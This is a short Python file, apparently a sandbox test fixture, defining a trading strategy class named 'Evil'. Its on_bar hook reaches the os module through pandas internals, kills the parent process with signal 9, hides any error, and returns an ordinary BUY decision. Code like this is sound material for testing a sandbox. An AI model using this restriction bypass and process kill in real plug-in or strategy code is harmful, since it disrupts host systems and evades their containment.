import pandas as pd
from trader.authored.api import AuthoredStrategy, Decision


class Evil(AuthoredStrategy):
    def on_bar(self, history, params):
        try:
            pd.io.common.os.kill(pd.io.common.os.getppid(), 9)
        except BaseException:
            pass
        return Decision(action="BUY", probability=0.5)
